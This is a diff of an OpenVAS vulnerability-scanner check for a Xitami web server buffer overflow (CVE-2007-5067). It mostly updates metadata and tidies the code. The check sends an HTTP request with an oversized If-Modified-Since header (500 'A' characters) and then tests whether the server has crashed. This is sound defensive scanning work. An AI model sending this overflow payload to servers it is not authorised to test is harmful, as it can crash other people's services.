@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_xitami_web_server_if_modified_since_bof_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
+# $Id: gb_xitami_web_server_if_modified_since_bof_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
 #
 # Xitami Web Server If-Modified-Since Buffer Overflow Vulnerability
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802025");
-  script_version("$Revision: 11997 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
+  script_version("$Revision: 13660 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
   script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
   script_bugtraq_id(25772);
   script_cve_id("CVE-2007-5067");
@@ -51,14 +51,18 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated
   attackers to execute arbitrary code on the system or cause the application to crash.");
+
   script_tag(name:"affected", value:"iMatix Xitami Web Server Version 2.5c2 and 2.5b4, Other versions
   may also be affected.");
+
   script_tag(name:"insight", value:"The flaw is caused the way xitami web server handles
   'If-Modified-Since' header. which can be exploited to cause a buffer overflow by
   sending a specially-crafted parameter to 'If-Modified-Since' header.");
+
   script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
   of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
   release, disable respective features, remove the product or replace the product by another one.");
+
   script_tag(name:"summary", value:"This host is running Xitami Web Server and is prone to buffer
   overflow vulnerability.");
 
@@ -72,26 +76,23 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-host = http_host_name(port:port);
-
 banner = get_http_banner(port: port);
-if("Server: Xitami" >!< banner) {
+if(!banner || "Server: Xitami" >!< banner)
   exit(0);
-}
+
+useragent = http_get_user_agent();
+host = http_host_name(port:port);
 
 craftedReq = string("GET / HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
-                    "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+                    "User-Agent: ", useragent, "\r\n",
                     "If-Modified-Since: ! ", crap(data:'A', length:500),
                     "\r\n\r\n");
 
-## Send crafted data to server
 res = http_send_recv(port:port, data:craftedReq);
 
 sleep(1);
 
-## server is died and it's vulnerable
 req = http_get(item:"/", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if("Server: Xitami" >!< res) {
